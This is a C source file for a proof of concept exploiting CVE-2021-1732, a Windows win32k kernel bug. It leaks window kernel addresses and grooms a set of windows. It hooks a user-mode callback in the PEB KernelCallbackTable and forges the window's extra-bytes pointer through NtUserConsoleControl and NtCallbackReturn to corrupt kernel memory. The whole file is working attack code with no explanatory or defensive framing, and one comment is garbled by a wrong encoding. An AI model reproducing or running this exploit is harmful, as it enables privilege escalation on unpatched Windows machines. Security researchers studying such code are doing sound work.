#include "CVE-2021-1732.h"

lpfnxxxClientAllocWindowClassExtraBytes g_orgClientAllocWindowExtraBytes = NULL;
lpfnNtCallbackReturn fnNtCallbackReturn = NULL;
lpfnNtUserConsoleControl fnNtUserConsoleControl = NULL;
HWND g_hWnd[55] = { NULL };
ULONG64 g_pWnd[55] = { NULL };
HWND g_hTriggerWnd = NULL;
DWORD g_dwWndExtra = 0x1900;
DWORD CONST g_dwWinNum = 50, g_cbWndExtra_offset = 0xC8;

BOOL Exploit_CVE_2021_1732()
{
	BOOL bRet = TRUE;

	if (!POC_CVE_2021_1732())
	{
		bRet = FALSE;
		goto exit;
	}

exit:
	return bRet;
}

BOOL Init_CVE_2021_1732()
{
	BOOL bRet = TRUE;
	DWORD i = 0;

	lHMValidateHandle HMValidateHandle = NULL;

	HMValidateHandle = (lHMValidateHandle)GetHMValidateHandle();
	if (!HMValidateHandle)
	{
		bRet = FALSE;
		goto exit;
	}

	HMODULE hNtDll = NULL, hWin32Dll = NULL;

	hNtDll = LoadLibrary("ntdll.dll");
	hWin32Dll = LoadLibrary("win32u.dll");

	if (!hNtDll || !hWin32Dll)
	{
		bRet = FALSE;
		ShowError("LoadLibrary", GetLastError());
		goto exit;
	}

	fnNtCallbackReturn = (lpfnNtCallbackReturn)GetProcAddress(hNtDll, "NtCallbackReturn");
	fnNtUserConsoleControl = (lpfnNtUserConsoleControl)GetProcAddress(hWin32Dll, "NtUserConsoleControl");
	
	if (!fnNtCallbackReturn || !fnNtUserConsoleControl)
	{
		bRet = FALSE;
		ShowError("GetProcAddress", GetLastError());
		goto exit;
	}

	HINSTANCE handle = NULL;

	handle = GetModuleHandle(NULL);
	if (!handle)
	{
		bRet = FALSE;
		ShowError("GetModuleHandle", GetLastError());
		goto exit;
	}

	WNDCLASSEX wndClass = { 0 };
	PCHAR pClassName = "leak";

	wndClass.cbWndExtra = 0x20;
	wndClass.cbSize = sizeof(wndClass);
	wndClass.style = CS_VREDRAW | CS_HREDRAW;
	wndClass.hInstance = handle;
	wndClass.lpfnWndProc = DefWindowProc;
	wndClass.lpszClassName = pClassName;

	if (!RegisterClassEx(&wndClass))
	{
		bRet = FALSE;
		ShowError("RegisterClassEx", GetLastError());
		goto exit;
	}

	HWND hWnd = NULL;

	for (i = 0; i < g_dwWinNum; i++)
	{
		hWnd = CreateWindowEx(WS_EX_NOACTIVATE,
							  pClassName,
							  NULL,
			                  WS_DISABLED,
							  0, 0, 0, 0,
							  NULL, 
							  NULL, 
							  handle,
			                  NULL);
		if (!hWnd)	continue;

		g_hWnd[i] = hWnd;
		g_pWnd[i] = (ULONG64)HMValidateHandle(hWnd, TYPE_WINDOW);
	}

	for (i = 2; i < g_dwWinNum; i += 2)
	{
		if (g_hWnd[i])
		{
			DestroyWindow(g_hWnd[i]);
		}
	}

exit:
	return bRet;
}

NTSTATUS MyxxxClientAllocWindowClassExtraBytes(PVOID arg0)
{
	if (*(PDWORD)arg0 == g_dwWndExtra)
	{
		HWND hTriggerWnd = NULL;
		DWORD i = 0;

		for (i = 2; i < g_dwWinNum; i += 2)
		{
			if (g_hWnd[i])
			{
				DWORD cbWndExtra = *(PDWORD)(g_pWnd[i] + g_cbWndExtra_offset);
				if (cbWndExtra == g_dwWndExtra)
				{
					hTriggerWnd = (HWND)*(PULONG64)g_pWnd[i];	
					break;
				}
			}
		}

		if (hTriggerWnd)
		{
			
			BYTE bInfo[0x10] = { 0 };

			// tagWND->Flag |= 0x800
			*(HWND *)bInfo = hTriggerWnd;
			fnNtUserConsoleControl(6, bInfo, sizeof(bInfo));
			
			BYTE bRes[0x18] = { 0 };

			// ÉèÖÃtagWND->pExtraBytes
			*(PULONG64)bRes = 0xFFFFFF00;
			return fnNtCallbackReturn(bRes, sizeof(bRes), 0);
		}
		else printf("do not find hTriggerWnd\n");
	}

	return g_orgClientAllocWindowExtraBytes(arg0);
}

BOOL InitTriggerWnd()
{
	BOOL bRet = TRUE;

	HINSTANCE handle = NULL;

	handle = GetModuleHandle(NULL);
	if (!handle)
	{
		bRet = FALSE;
		ShowError("GetModuleHandle", GetLastError());
		goto exit;
	}

	PCHAR pClassName = "Trigger";
	WNDCLASSEX wndClass = { 0 };

	wndClass.cbSize = sizeof(wndClass);
	wndClass.lpfnWndProc = DefWindowProc;
	wndClass.style = CS_VREDRAW | CS_HREDRAW;
	wndClass.cbWndExtra = g_dwWndExtra;
	wndClass.hInstance = handle;
	wndClass.lpszClassName = pClassName;

	if (!RegisterClassEx(&wndClass))
	{
		bRet = FALSE;
		ShowError("RegisterClassEx", GetLastError());
		goto exit;
	}

	g_hTriggerWnd = CreateWindowEx(WS_EX_NOACTIVATE,
							       pClassName,
								   NULL,
								   WS_DISABLED,
								   0, 0, 0, 0,
								   NULL,
								   NULL,
								   handle,
								   NULL);

	if (!g_hTriggerWnd)
	{
		bRet = FALSE;
		ShowError("CreateWindowEx", GetLastError());
		goto exit;
	}

exit:
	return bRet;
}

BOOL POC_CVE_2021_1732()
{
	BOOL bRet = TRUE;

	if (!Init_CVE_2021_1732())
	{
		bRet = FALSE;
		goto exit;
	}

	if (!HookFunc_CVE_2021_1732())
	{
		bRet = FALSE;
		goto exit;
	}

	if (!InitTriggerWnd())
	{
		bRet = FALSE;
		goto exit;
	}

	if (!SetWindowLongPtr(g_hTriggerWnd, 0, 1234) && GetLastError() != 0)
	{
		bRet = FALSE;
		ShowError("CreateWindowEx", GetLastError());
		goto exit;
	}

exit:
	return bRet;
}

BOOL HookFunc_CVE_2021_1732()
{
	BOOL bRet = TRUE;
	ULONG64 ulKernelCallBackTable = *(PULONG64)(GetPEB() + 0x58);

	DWORD dwOldProtect = 0;

	if (!VirtualProtect((PVOID)ulKernelCallBackTable, PAGE_SIZE, PAGE_READWRITE, &dwOldProtect))
	{
		bRet = FALSE;
		ShowError("VirtualProtect", GetLastError());
		goto exit;
	}

	g_orgClientAllocWindowExtraBytes = (lpfnxxxClientAllocWindowClassExtraBytes)*(PULONG64)(ulKernelCallBackTable + 0x8 * 0x7B);
	*(PULONG64)(ulKernelCallBackTable + 0x8 * 0x7B) = (ULONG64)MyxxxClientAllocWindowClassExtraBytes;

	if (!VirtualProtect((PVOID)ulKernelCallBackTable, PAGE_SIZE, dwOldProtect, &dwOldProtect))
	{
		bRet = FALSE;
		ShowError("VirtualProtect", GetLastError());
		goto exit;
	}

exit:
	return bRet;
}
